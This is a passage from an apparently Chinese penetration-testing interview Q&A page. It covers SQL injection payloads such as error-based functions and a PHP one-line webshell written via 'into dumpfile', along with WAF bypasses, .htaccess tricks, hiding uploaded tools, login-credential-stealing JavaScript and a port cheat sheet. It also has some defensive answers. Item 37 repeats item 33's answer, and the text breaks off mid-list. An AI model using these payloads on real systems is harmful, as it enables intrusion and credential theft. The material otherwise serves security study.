id="如何⼿⼯快速判断⽬标站是-windows-还是-linux-服务器？"><a href="#如何⼿⼯快速判断⽬标站是-windows-还是-linux-服务器？" class="headerlink" title="如何⼿⼯快速判断⽬标站是 windows 还是 linux 服务器？"></a>如何⼿⼯快速判断⽬标站是 windows 还是 linux 服务器？</h4></li></ol><p>linux ⼤⼩写敏感, windows ⼤⼩写不敏感。 </p><h4 id="8-为何⼀个-mysql-数据库的站，只有⼀个-80-端⼝开放？"><a href="#8-为何⼀个-mysql-数据库的站，只有⼀个-80-端⼝开放？" class="headerlink" title="8. 为何⼀个 mysql 数据库的站，只有⼀个 80 端⼝开放？"></a>8. 为何⼀个 mysql 数据库的站，只有⼀个 80 端⼝开放？</h4><p>更改了端⼝，没有扫描出来。 </p><p>站库分离。 </p><p>3306 端⼝不对外开放 </p><h4 id="9、3389-⽆法连接的⼏种情况"><a href="#9、3389-⽆法连接的⼏种情况" class="headerlink" title="9、3389 ⽆法连接的⼏种情况"></a>9、3389 ⽆法连接的⼏种情况</h4><p>没开放 3389 端⼝ </p><p>端⼝被修改防护拦截</p><p>处于内⽹ (需进⾏端⼝转发) </p><h4 id="10-如何突破注⼊时字符被转义？"><a href="#10-如何突破注⼊时字符被转义？" class="headerlink" title="10. 如何突破注⼊时字符被转义？"></a>10. 如何突破注⼊时字符被转义？</h4><p>宽字符注⼊ </p><p>hex 编码绕过 </p><h4 id="11-在某后台新闻编辑界⾯看到编辑器，应该先做什么？"><a href="#11-在某后台新闻编辑界⾯看到编辑器，应该先做什么？" class="headerlink" title="11. 在某后台新闻编辑界⾯看到编辑器，应该先做什么？"></a>11. 在某后台新闻编辑界⾯看到编辑器，应该先做什么？</h4><p>查看编辑器的名称版本, 然后搜索公开的漏洞。 </p><h4 id="12-拿到⼀个-webshell-发现⽹站根⽬录下有-htaccess-⽂件，我们能做什么？"><a href="#12-拿到⼀个-webshell-发现⽹站根⽬录下有-htaccess-⽂件，我们能做什么？" class="headerlink" title="12. 拿到⼀个 webshell 发现⽹站根⽬录下有. htaccess ⽂件，我们能做什么？"></a>12. 拿到⼀个 webshell 发现⽹站根⽬录下有. htaccess ⽂件，我们能做什么？</h4><p>能做的事情很多，⽤隐藏⽹⻢来举例⼦： </p><p>插⼊</p><p>&lt;FilesMatch “xxx.jpg”&gt; SetHandler application/x-httpd-php </p><p>.jpg ⽂件会被解析成. php ⽂件。 </p><p>具体其他的事情，不好详说，建议⼤家⾃⼰去搜索语句来玩玩。 </p><h4 id="13-注⼊漏洞只能查账号密码？"><a href="#13-注⼊漏洞只能查账号密码？" class="headerlink" title="13. 注⼊漏洞只能查账号密码？"></a>13. 注⼊漏洞只能查账号密码？</h4><p>只要权限⼴，拖库脱到⽼。 </p><h4 id="14-安全狗会追踪变量，从⽽发现出是⼀句话⽊⻢吗？"><a href="#14-安全狗会追踪变量，从⽽发现出是⼀句话⽊⻢吗？" class="headerlink" title="14. 安全狗会追踪变量，从⽽发现出是⼀句话⽊⻢吗？"></a>14. 安全狗会追踪变量，从⽽发现出是⼀句话⽊⻢吗？</h4><p>是根据特征码，所以很好绕过了，只要思路宽，绕狗绕到欢，但这应该不会是⼀成不变的。 </p><h4 id="15-access-扫出后缀为-asp-的数据库⽂件，访问乱码，-如何实现到本地利⽤？"><a href="#15-access-扫出后缀为-asp-的数据库⽂件，访问乱码，-如何实现到本地利⽤？" class="headerlink" title="15.access 扫出后缀为 asp 的数据库⽂件，访问乱码， 如何实现到本地利⽤？"></a><strong>15.access 扫出后缀为 asp 的数据库⽂件，访问乱码，</strong> 如何实现到本地利⽤？</h4><p>迅雷下载，直接改后缀为. mdb。 </p><h4 id="16-提权时选择可读写⽬录，为何尽量不⽤带空格的⽬录？因为-exp-执⾏多半需要空格界定参数"><a href="#16-提权时选择可读写⽬录，为何尽量不⽤带空格的⽬录？因为-exp-执⾏多半需要空格界定参数" class="headerlink" title="16. 提权时选择可读写⽬录，为何尽量不⽤带空格的⽬录？因为 exp 执⾏多半需要空格界定参数"></a>16. 提权时选择可读写⽬录，为何尽量不⽤带空格的⽬录？因为 exp 执⾏多半需要空格界定参数</h4><h4 id="17-某服务器有站点-A-B-为何在-A-的后台添加-test-⽤户，访问-B-的后台。发现也添加上了-test-⽤户？"><a href="#17-某服务器有站点-A-B-为何在-A-的后台添加-test-⽤户，访问-B-的后台。发现也添加上了-test-⽤户？" class="headerlink" title="17. 某服务器有站点 A,B 为何在 A 的后台添加 test ⽤户，访问 B 的后台。发现也添加上了 test ⽤户？"></a>17. 某服务器有站点 A,B 为何在 A 的后台添加 test ⽤户，访问 B 的后台。发现也添加上了 test ⽤户？</h4><p>同数据库。 </p><h4 id="18-注⼊时可以不使⽤-and-或-or-或-xor，直接-order-by-开始注⼊吗？"><a href="#18-注⼊时可以不使⽤-and-或-or-或-xor，直接-order-by-开始注⼊吗？" class="headerlink" title="18. 注⼊时可以不使⽤ and 或 or 或 xor，直接 order by 开始注⼊吗？"></a>18. 注⼊时可以不使⽤ and 或 or 或 xor，直接 order by 开始注⼊吗？</h4><p>and/or/xor，前⾯的 1=1、1=2 步骤只是为了判断是否为注⼊点，如果已经确定是注⼊点那就可以省那步骤去。 </p><h4 id="19-某个防注⼊系统，在注⼊时会提示："><a href="#19-某个防注⼊系统，在注⼊时会提示：" class="headerlink" title="19: 某个防注⼊系统，在注⼊时会提示："></a>19: 某个防注⼊系统，在注⼊时会提示：</h4><p>系统检测到你有⾮法注⼊的⾏为。 </p><p>已记录您的 ip xx.xx.xx.xx </p><p>时间: 2016:01-23 </p><p>提交⻚⾯: test.asp?id=15 </p><p>提交内容: and 1=1 </p><h4 id="20、如何利⽤这个防注⼊系统拿-shell？"><a href="#20、如何利⽤这个防注⼊系统拿-shell？" class="headerlink" title="20、如何利⽤这个防注⼊系统拿 shell？"></a>20、如何利⽤这个防注⼊系统拿 shell？</h4><p>在 URL ⾥⾯直接提交⼀句话，这样⽹站就把你的⼀句话也记录进数据库⽂件了 这个时候可以尝试寻找⽹站的配置⽂件 </p><p>直接上菜⼑链接。 </p><h4 id="21-上传⼤⻢后访问乱码时，有哪些解决办法？"><a href="#21-上传⼤⻢后访问乱码时，有哪些解决办法？" class="headerlink" title="21. 上传⼤⻢后访问乱码时，有哪些解决办法？"></a>21. 上传⼤⻢后访问乱码时，有哪些解决办法？</h4><p>浏览器中改编码。 </p><h4 id="22-审查上传点的元素有什么意义？"><a href="#22-审查上传点的元素有什么意义？" class="headerlink" title="22. 审查上传点的元素有什么意义？"></a>22. 审查上传点的元素有什么意义？</h4><p>有些站点的上传⽂件类型的限制是在前端实现的，这时只要增加上传类型就能突破限制了。 </p><h4 id="23-⽬标站禁⽌注册⽤户，找回密码处随便输⼊⽤户名提示："><a href="#23-⽬标站禁⽌注册⽤户，找回密码处随便输⼊⽤户名提示：" class="headerlink" title="23. ⽬标站禁⽌注册⽤户，找回密码处随便输⼊⽤户名提示："></a>23. ⽬标站禁⽌注册⽤户，找回密码处随便输⼊⽤户名提示：</h4><p>“</p><p>此⽤户不存在</p><p>”</p><p>，你觉得这⾥怎样利⽤？先爆破⽤户名，再利⽤被爆破出来的⽤户名爆破密码。 </p><p>其实有些站点，在登陆处也会这样提示 </p><p>所有和数据库有交互的地⽅都有可能有注⼊。 </p><h4 id="24-⽬标站发现某-txt-的下载地址为"><a href="#24-⽬标站发现某-txt-的下载地址为" class="headerlink" title="24. ⽬标站发现某 txt 的下载地址为"></a>24. ⽬标站发现某 txt 的下载地址为</h4><p><a href="http://www.test.com/down/down.php?fifile=/upwdown/1.txt，你有什么思路？">http://www.test.com/down/down.php?fifile=/upwdown/1.txt，你有什么思路？</a> </p><p>这就是传说中的下载漏洞！在 fifile = 后⾯尝试输⼊ index.php 下载他的⾸⻚⽂件，然后在⾸⻚⽂件⾥继续查找其他⽹站 </p><p>的配置⽂件，可以找出⽹站的数据库密码和数据库的地址。 </p><h4 id="25-甲给你⼀个⽬标站，并且告诉你根⽬录下存在-abc-⽬录，并且此⽬录下存在编辑器和-admin-⽬录。请问你的想"><a href="#25-甲给你⼀个⽬标站，并且告诉你根⽬录下存在-abc-⽬录，并且此⽬录下存在编辑器和-admin-⽬录。请问你的想" class="headerlink" title="25. 甲给你⼀个⽬标站，并且告诉你根⽬录下存在 / abc / ⽬录，并且此⽬录下存在编辑器和 admin ⽬录。请问你的想"></a>25. 甲给你⼀个⽬标站，并且告诉你根⽬录下存在 / abc / ⽬录，并且此⽬录下存在编辑器和 admin ⽬录。请问你的想</h4><p>法是？ </p><p>直接在⽹站⼆级⽬录 / abc / 下扫描敏感⽂件及⽬录。 </p><h4 id="26-在有-shell-的情况下，如何使⽤-xss-实现对⽬标站的⻓久控制？"><a href="#26-在有-shell-的情况下，如何使⽤-xss-实现对⽬标站的⻓久控制？" class="headerlink" title="26. 在有 shell 的情况下，如何使⽤ xss 实现对⽬标站的⻓久控制？"></a>26. 在有 shell 的情况下，如何使⽤ xss 实现对⽬标站的⻓久控制？</h4><p>后台登录处加⼀段记录登录账号密码的 js，并且判断是否登录成功，如果登录成功，就把账号密码记录到⼀个⽣僻的路 </p><p>径的⽂件中或者直接发到⾃⼰的⽹站⽂件中。(此⽅法适合有价值并且需要深⼊控制权限的⽹络)。 </p><p>在登录后才可以访问的⽂件中插⼊ XSS 脚本。 </p><h4 id="27-后台修改管理员密码处，原密码显示为-。你觉得该怎样实现读出这个⽤户的密码？"><a href="#27-后台修改管理员密码处，原密码显示为-。你觉得该怎样实现读出这个⽤户的密码？" class="headerlink" title="27. 后台修改管理员密码处，原密码显示为 *。你觉得该怎样实现读出这个⽤户的密码？"></a>27. 后台修改管理员密码处，原密码显示为 *。你觉得该怎样实现读出这个⽤户的密码？</h4><p>审查元素 把密码处的 password 属性改成 text 就明⽂显示了 </p><h4 id="28-⽬标站⽆防护，上传图⽚可以正常访问，上传脚本格式访问则-403-什么原因？"><a href="#28-⽬标站⽆防护，上传图⽚可以正常访问，上传脚本格式访问则-403-什么原因？" class="headerlink" title="28. ⽬标站⽆防护，上传图⽚可以正常访问，上传脚本格式访问则 403. 什么原因？"></a>28. ⽬标站⽆防护，上传图⽚可以正常访问，上传脚本格式访问则 403. 什么原因？</h4><p>原因很多，有可能 web 服务器配置把上传⽬录写死了不执⾏相应脚本，尝试改后缀名绕过 </p><h4 id="29-审查元素得知⽹站所使⽤的防护软件，你觉得怎样做到的？"><a href="#29-审查元素得知⽹站所使⽤的防护软件，你觉得怎样做到的？" class="headerlink" title="29. 审查元素得知⽹站所使⽤的防护软件，你觉得怎样做到的？"></a>29. 审查元素得知⽹站所使⽤的防护软件，你觉得怎样做到的？</h4><p>在敏感操作被拦截，通过界⾯信息⽆法具体判断是什么防护的时候，F12 看 HTML 体部 ⽐如护卫神就可以在名称那看到内容。 </p><h4 id="30-在-win2003-服务器中建⽴⼀个-zhongzi-⽂件夹⽤意何为？"><a href="#30-在-win2003-服务器中建⽴⼀个-zhongzi-⽂件夹⽤意何为？" class="headerlink" title="30. 在 win2003 服务器中建⽴⼀个 .zhongzi ⽂件夹⽤意何为？"></a>30. 在 win2003 服务器中建⽴⼀个 .zhongzi ⽂件夹⽤意何为？</h4><p>隐藏⽂件夹，为了不让管理员发现你传上去的⼯具。 </p><h4 id="31、sql-注⼊有以下两个测试选项，选⼀个并且阐述不选另⼀个的理由："><a href="#31、sql-注⼊有以下两个测试选项，选⼀个并且阐述不选另⼀个的理由：" class="headerlink" title="31、sql 注⼊有以下两个测试选项，选⼀个并且阐述不选另⼀个的理由："></a>31、sql 注⼊有以下两个测试选项，选⼀个并且阐述不选另⼀个的理由：</h4><p>A. demo.jsp?id=2+1 </p><p>B. demo.jsp?id=2-1 </p><p>选 B，在 URL 编码中 + 代表空格，可能会造成混淆</p><h4 id="32、以下链接存在-sql-注⼊漏洞，对于这个变形注⼊，你有什么思路？"><a href="#32、以下链接存在-sql-注⼊漏洞，对于这个变形注⼊，你有什么思路？" class="headerlink" title="32、以下链接存在 sql 注⼊漏洞，对于这个变形注⼊，你有什么思路？"></a>32、以下链接存在 sql 注⼊漏洞，对于这个变形注⼊，你有什么思路？</h4><p>demo.do?DATA=AjAxNg== </p><p>DATA 有可能经过了 base64 编码再传⼊服务器，所以我们也要对参数进⾏ base64 编码才能正确完成测试 </p><h4 id="33、发现-demo-jsp-uid-110-注⼊点，你有哪⼏种思路获取-webshell，哪种是优选？"><a href="#33、发现-demo-jsp-uid-110-注⼊点，你有哪⼏种思路获取-webshell，哪种是优选？" class="headerlink" title="33、发现 demo.jsp?uid=110 注⼊点，你有哪⼏种思路获取 webshell，哪种是优选？"></a>33、发现 demo.jsp?uid=110 注⼊点，你有哪⼏种思路获取 webshell，哪种是优选？</h4><p>有写⼊权限的，构造联合查询语句使⽤ using INTO OUTFILE，可以将查询的输出重定向到系统的⽂件中，这样去写⼊</p><p>WebShell 使⽤ sqlmap –os-shell 原理和上⾯⼀种相同，来直接获得⼀个 Shell，这样效率更⾼ 通过构造联合查询语句 </p><p>得到⽹站管理员的账户和密码，然后扫后台登录后台，再在后台通过改包上传等⽅法上传 Shell </p><h4 id="34、CSRF-和-XSS-和-XXE-有什么区别，以及修复⽅式？"><a href="#34、CSRF-和-XSS-和-XXE-有什么区别，以及修复⽅式？" class="headerlink" title="34、CSRF 和 XSS 和 XXE 有什么区别，以及修复⽅式？"></a>34、CSRF 和 XSS 和 XXE 有什么区别，以及修复⽅式？</h4><p>XSS 是跨站脚本攻击，⽤户提交的数据中可以构造代码来执⾏，从⽽实现窃取⽤户信息等攻击。修复⽅式：对字符实体 </p><p>进⾏转义、使⽤ HTTP Only 来禁⽌ JavaScript 读取 Cookie 值、输⼊时校验、浏览器与 Web 应⽤端采⽤相同的字符编 </p><p>码。</p><p>CSRF 是跨站请求伪造攻击，XSS 是实现 CSRF 的诸多⼿段中的⼀种，是由于没有在关键操作执⾏时进⾏是否由⽤户⾃ </p><p>愿发起的确认。修复⽅式：筛选出需要防范 CSRF 的⻚⾯然后嵌⼊ Token、再次输⼊密码、检验 Referer XXE 是 XML </p><p>外部实体注⼊攻击，XML 中可以通过调⽤实体来请求本地或者远程内容，和远程⽂件保护类似，会引发相关安全问题，例如敏感⽂件读取。修复⽅式：XML 解析库在调⽤时严格禁⽌对外部实体的解析。 </p><h4 id="35、CSRF、SSRF-和重放攻击有什么区别？"><a href="#35、CSRF、SSRF-和重放攻击有什么区别？" class="headerlink" title="35、CSRF、SSRF 和重放攻击有什么区别？"></a>35、CSRF、SSRF 和重放攻击有什么区别？</h4><p>CSRF 是跨站请求伪造攻击，由客户端发起 SSRF 是服务器端请求伪造，由服务器发起 重放攻击是将截获的数据包进⾏ </p><p>重放，达到身份认证等⽬的</p><h4 id="36、说出⾄少三种业务逻辑漏洞，以及修复⽅式？"><a href="#36、说出⾄少三种业务逻辑漏洞，以及修复⽅式？" class="headerlink" title="36、说出⾄少三种业务逻辑漏洞，以及修复⽅式？"></a>36、说出⾄少三种业务逻辑漏洞，以及修复⽅式？</h4><p>密码找回漏洞中存在 </p><p>1）密码允许暴⼒破解、 </p><p>2）存在通⽤型找回凭证、 </p><p>3）可以跳过验证步骤、 </p><p>4）找回凭证可以拦包获取 </p><p>等⽅式来通过⼚商提供的密码找回功能来得到密码。身份认证漏洞中最常⻅的是 </p><p>1）会话固定攻击 </p><p>2） Cookie 仿冒 </p><p>只要得到 Session 或 Cookie 即可伪造⽤户身份。验证码漏洞中存在 </p><p>1）验证码允许暴⼒破解 </p><p>2）验证码可以通过 Javascript 或者改包的⽅法来进⾏绕过 </p><h4 id="37、圈出下⾯会话中可能存在问题的项，并标注可能会存在的问题？"><a href="#37、圈出下⾯会话中可能存在问题的项，并标注可能会存在的问题？" class="headerlink" title="37、圈出下⾯会话中可能存在问题的项，并标注可能会存在的问题？"></a>37、圈出下⾯会话中可能存在问题的项，并标注可能会存在的问题？</h4><p>get /ecskins/demo jsp?uid=2016031900&amp;keyword=”hello world”get /ecskins/demo.jsp?uid=2016031900&amp;keyword= hello world</p><p>HTTP/1.1Host:***.com:82User-Agent:Mozilla/</p><p>5.0 Firefox/40Accept:text/css,/;q=0.1</p><p>Accept-Language:zh-CN;zh;q=0.8;en-US;q=0.5,en;q=0.3</p><p>Referer:http://<strong>***</strong>.com/eciop/orderForCC/</p><p>cgtListForCC.htm?zone=11370601&amp;v=145902</p><p>Cookie:myguid1234567890=1349db5fe50c372c3d995709f54c273d;</p><p>uniqueserid=session_OGRMIFIYJHAH5_HZRQOZAMHJ;</p><p>st_uid=N90PLYHLZGJXI-NX01VPUF46W;</p><p>status=True</p><p>Connection:keep-alive</p><p>有写⼊权限的，构造联合查询语句使⽤ using INTO OUTFILE，可以将查询的输出重定向到系统的⽂件中，这样去写⼊</p><p>WebShell 使⽤ sqlmap –os-shell 原理和上⾯⼀种相同，来直接获得⼀个 Shell，这样效率更⾼ 通过构造联合查询语句 </p><p>得到⽹站管理员的账户和密码，然后扫后台登录后台，再在后台通过改包上传等⽅法上传 Shell </p><h4 id="38、给你⼀个⽹站你是如何来渗透测试的-在获取书⾯授权的前提下。"><a href="#38、给你⼀个⽹站你是如何来渗透测试的-在获取书⾯授权的前提下。" class="headerlink" title="38、给你⼀个⽹站你是如何来渗透测试的? 在获取书⾯授权的前提下。"></a>38、给你⼀个⽹站你是如何来渗透测试的? 在获取书⾯授权的前提下。</h4><h4 id="39、sqlmap，怎么对⼀个注⼊点注⼊？"><a href="#39、sqlmap，怎么对⼀个注⼊点注⼊？" class="headerlink" title="39、sqlmap，怎么对⼀个注⼊点注⼊？"></a>39、sqlmap，怎么对⼀个注⼊点注⼊？</h4><p>1）如果是 get 型号，直接，sqlmap -u “诸如点⽹址”. </p><p>2) 如果是 post 型诸如点，可以 sqlmap -u “注⼊点⽹址” –data=”post 的参数 “ </p><p>3）如果是 cookie，X-Forwarded-For 等，可以访问的时候，⽤ burpsuite 抓包，注⼊处⽤号替换，放到⽂件⾥，然后 </p><p>sqlmap -r “⽂件地址” </p><h4 id="40、nmap，扫描的⼏种⽅式"><a href="#40、nmap，扫描的⼏种⽅式" class="headerlink" title="40、nmap，扫描的⼏种⽅式"></a>40、nmap，扫描的⼏种⽅式</h4><h4 id="41、sql-注⼊的⼏种类型？"><a href="#41、sql-注⼊的⼏种类型？" class="headerlink" title="41、sql 注⼊的⼏种类型？"></a>41、sql 注⼊的⼏种类型？</h4><p>1）报错注⼊ </p><p>2）bool 型注⼊ </p><p>3）延时注⼊ </p><p>4）宽字节注⼊ </p><h4 id="42、报错注⼊的函数有哪些？10-个"><a href="#42、报错注⼊的函数有哪些？10-个" class="headerlink" title="42、报错注⼊的函数有哪些？10 个"></a>42、报错注⼊的函数有哪些？10 个</h4><p>1）and extractvalue(1, concat(0x7e,(select @@version),0x7e))】】】</p><p>2）通过floor报错 向下取整3）+and updatexml(1, concat(0x7e,(secect @@version),0x7e),1) </p><p>4）.geometrycollection()select from test where id=1 and geometrycollection((select from(selectfrom(select user())a)</p><p>b));</p><p>5）.multipoint()select from test where id=1 and multipoint((select from(select from(select user())a)b));</p><p>6）.polygon()select from test where id=1 and polygon((select from(select from(select user())a)b));</p><p>7）.multipolygon()select from test where id=1 and multipolygon((select from(select from(select user())a)b));</p><p>8）.linestring()select from test where id=1 and linestring((select from(select from(select user())a)b));</p><p>9）.multilinestring()select from test where id=1 and multilinestring((select from(select from(select user())a)b));</p><p>10）.exp()select from test where id=1 and exp(~(select * from(select user())a));</p><h4 id="43、延时注⼊如何来判断？"><a href="#43、延时注⼊如何来判断？" class="headerlink" title="43、延时注⼊如何来判断？"></a>43、延时注⼊如何来判断？</h4><p>if(ascii(substr(“hello”, 1, 1))=104, sleep(5), 1) </p><h4 id="44、盲注和延时注⼊的共同点？"><a href="#44、盲注和延时注⼊的共同点？" class="headerlink" title="44、盲注和延时注⼊的共同点？"></a>44、盲注和延时注⼊的共同点？</h4><p>都是⼀个字符⼀个字符的判断 </p><h4 id="45、如何拿⼀个⽹站的-webshell？上传，后台编辑模板，sql-注⼊写⽂件，命令执⾏，代码执⾏，-⼀些已经爆出的-cms"><a href="#45、如何拿⼀个⽹站的-webshell？上传，后台编辑模板，sql-注⼊写⽂件，命令执⾏，代码执⾏，-⼀些已经爆出的-cms" class="headerlink" title="45、如何拿⼀个⽹站的 webshell？上传，后台编辑模板，sql 注⼊写⽂件，命令执⾏，代码执⾏， ⼀些已经爆出的 cms"></a>45、如何拿⼀个⽹站的 webshell？上传，后台编辑模板，sql 注⼊写⽂件，命令执⾏，代码执⾏， ⼀些已经爆出的 cms</h4><p>漏洞，⽐如 dedecms 后台可以直接建⽴脚本⽂件，wordpress 上传插件包含脚本⽂件 zip 压缩包等 </p><h4 id="46、sql-注⼊写⽂件都有哪些函数？"><a href="#46、sql-注⼊写⽂件都有哪些函数？" class="headerlink" title="46、sql 注⼊写⽂件都有哪些函数？"></a>46、sql 注⼊写⽂件都有哪些函数？</h4><p>select ‘⼀句话’ into outfile ‘路径’</p><p>select ‘⼀句话’ into dumpfile ‘路径’</p><p>select ‘<?php eval($_POST[1]) ?>‘ into dumpfile ‘d:\wwwroot\baidu.com\nvhack.php’; </p><h4 id="47、如何防⽌-CSRF"><a href="#47、如何防⽌-CSRF" class="headerlink" title="47、如何防⽌ CSRF?"></a>47、如何防⽌ CSRF?</h4><p>1）验证 referer </p><p>2）验证 token </p><p>详细：<a href="http://cnodejs.org/topic/5533dd6e9138f09b629674fd">http://cnodejs.org/topic/5533dd6e9138f09b629674fd</a> </p><h4 id="48、owasp-漏洞都有哪些？"><a href="#48、owasp-漏洞都有哪些？" class="headerlink" title="48、owasp 漏洞都有哪些？"></a>48、owasp 漏洞都有哪些？</h4><p>1）SQL 注⼊防护⽅法： </p><p>2）失效的身份认证和会话管理2）失效的身份认证和会话管理 </p><p>3）跨站脚本攻击 XSS </p><p>4）直接引⽤不安全的对象 </p><p>5）安全配置错误 </p><p>6）敏感信息泄露 </p><p>7）缺少功能级的访问控制 </p><p>8）跨站请求伪造 CSRF </p><p>9）使⽤含有已知漏洞的组件 </p><p>10）未验证的重定向和转发 </p><h4 id="49、SQL-注⼊防护⽅法？"><a href="#49、SQL-注⼊防护⽅法？" class="headerlink" title="49、SQL 注⼊防护⽅法？"></a>49、SQL 注⼊防护⽅法？</h4><p>1）使⽤安全的 API </p><p>2）对输⼊的特殊字符进⾏ Escape 转义处理 </p><p>3）使⽤⽩名单来规范化输⼊验证⽅法 </p><p>4）对客户端输⼊进⾏控制，不允许输⼊ SQL 注⼊相关的特殊字符 </p><p>5）服务器端在提交数据库进⾏ SQL 查询之前，对特殊字符进⾏过滤、转义、替换、删除。 </p><h4 id="50、代码执⾏，⽂件读取，命令执⾏的函数都有哪些？"><a href="#50、代码执⾏，⽂件读取，命令执⾏的函数都有哪些？" class="headerlink" title="50、代码执⾏，⽂件读取，命令执⾏的函数都有哪些？"></a>50、代码执⾏，⽂件读取，命令执⾏的函数都有哪些？</h4><p>1）代码执⾏：</p><p>eval,preg_replace+/e,assert,call_user_func,call_user_func_array,create_function</p><p>2）⽂件读取：</p><p>file_get_contents(),highlight_file(),fopen(),read</p><p>file(),fread(),fgetss(), fgets(),parse_ini_file(),show_source(),file()等</p><p>3)命令执⾏：</p><p>system(), exec(), shell_exec(), passthru() ,pcntl_exec(), popen(),proc_open()</p><h4 id="51、img-标签除了-onerror-属性外，还有其他获取管理员路径的办法吗？"><a href="#51、img-标签除了-onerror-属性外，还有其他获取管理员路径的办法吗？" class="headerlink" title="51、img 标签除了 onerror 属性外，还有其他获取管理员路径的办法吗？"></a>51、img 标签除了 onerror 属性外，还有其他获取管理员路径的办法吗？</h4><p>src 指定⼀个远程的脚本⽂件，获取 referer52、img 标签除了 onerror 属性外，并且 src 属性的后缀名，必须以. jpg 结尾，怎么获取管理员路径。 </p><p>1）远程服务器修改 apache 配置⽂件，配置. jpg ⽂件以 php ⽅式来解析 AddType application/x-httpd-php .jpg &lt;img </p><p>src=<a href="http://xss.tv/1.jpg&gt;">http://xss.tv/1.jpg&gt;</a> 会以 php ⽅式来解析 </p><h4 id="53、为什么-aspx-⽊⻢权限⽐-asp-⼤？"><a href="#53、为什么-aspx-⽊⻢权限⽐-asp-⼤？" class="headerlink" title="53、为什么 aspx ⽊⻢权限⽐ asp ⼤？"></a>53、为什么 aspx ⽊⻢权限⽐ asp ⼤？</h4><p>aspx 使⽤的是. net 技术。IIS 中默认不⽀持，ASP 只是脚本语⾔⽽已。⼊侵的时候 asp 的⽊⻢⼀般是 guest 权限… </p><p>APSX 的⽊⻢⼀般是 users 权限。 </p><h4 id="54、如何绕过-waf？"><a href="#54、如何绕过-waf？" class="headerlink" title="54、如何绕过 waf？"></a>54、如何绕过 waf？</h4><p>⼤⼩写转换法 </p><p>⼲扰字符 /<em>!</em>/</p><p>编码 base64 unicode hex url ascll </p><p>复参数 </p><h4 id="55、如何向服务器写⼊-webshell？"><a href="#55、如何向服务器写⼊-webshell？" class="headerlink" title="55、如何向服务器写⼊ webshell？"></a>55、如何向服务器写⼊ webshell？</h4><p>各种上传漏洞</p><p>mysql具有写⼊权限,⽤sql语句写⼊shell</p><p>http put⽅法 </p><h4 id="56、渗透测试中常⻅的端⼝"><a href="#56、渗透测试中常⻅的端⼝" class="headerlink" title="56、渗透测试中常⻅的端⼝"></a>56、渗透测试中常⻅的端⼝</h4><p>a、web 类 (web 漏洞 / 敏感⽬录) 第三⽅通⽤组件漏洞 struts thinkphp jboss ganglia zabbix</p><p>80 web </p><p>80-89 web </p><p>8000-9090 web</p><p>b、数据库类 (扫描弱⼝令)1433 MSSQL </p><p>1521 Oracle </p><p>3306 MySQL </p><p>5432 PostgreSQL</p><p>c、特殊服务类 (未授权 / 命令执⾏类 / 漏洞)</p><p>443 SSL⼼脏滴⾎</p><p>873 Rsync未授权</p><p>5984 CouchDB <a href="http://xxx:5984/_utils/">http://xxx:5984/_utils/</a> </p><p>6379 redis未授权</p><p>7001,7002 WebLogic默认弱⼝令，反序列</p><p>9200,9300 elasticsearch 参考WooYun: 多玩某服务器ElasticSearch命令执⾏漏洞</p><p>11211 memcache未授权访问</p><p>27017,27018 Mongodb未授权访问</p><p>50000 SAP命令执⾏</p><p>50070,50030 hadoop默认端⼝未授权访问 </p><p>d、常⽤端⼝类 (扫描弱⼝令 / 端⼝爆破)</p><p>21 ftp </p><p>22 SSH </p><p>23 Telnet </p><p>2601,2604 zebra路由，默认密码zebra</p><p>3389 远程桌⾯ </p><h5 id="ALL、端⼝合计详情"><a href="#ALL、端⼝合计详情" class="headerlink" title="ALL、端⼝合计详情"></a>ALL、端⼝合计详情</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line">21 ftp </span><br><span class="line"></span><br><span class="line">22 SSH </span><br><span class="line"></span><br><span class="line">23 Telnet </span><br><span class="line"></span><br><span class="line">80 web </span><br><span class="line"></span><br><span class="line">80-89 web </span><br><span class="line"></span><br><span class="line">161 SNMP </span><br><span class="line"></span><br><span class="line">389 LDAP </span><br><span class="line"></span><br><span class="line">443 SSL⼼脏滴⾎以及⼀些web漏洞测试</span><br><span class="line"></span><br><span class="line">445 SMB 512,513,514 Rexec </span><br><span class="line"></span><br><span class="line">873 Rsync未授权</span><br><span class="line"></span><br><span class="line">1025,111 NFS </span><br><span class="line"></span><br><span class="line">1433 MSSQL </span><br><span class="line"></span><br><span class="line">1521 Oracle:(iSqlPlus Port:5560,7778) </span><br><span class="line"></span><br><span class="line">2082&#x2F;2083 cpanel主机管理系统登陆 （国外⽤较多）</span><br><span class="line"></span><br><span class="line">2222 DA虚拟主机管理系统登陆 （国外⽤较多）</span><br><span class="line"></span><br><span class="line">2601,2604 zebra路由，默认密码zebra</span><br><span class="line"></span><br><span class="line">3128 squid代理默认端⼝，如果没设置⼝令很可能就直接漫游内⽹了</span><br><span class="line"></span><br><span class="line">3306 MySQL </span><br><span class="line"></span><br><span class="line">3312&#x2F;3311 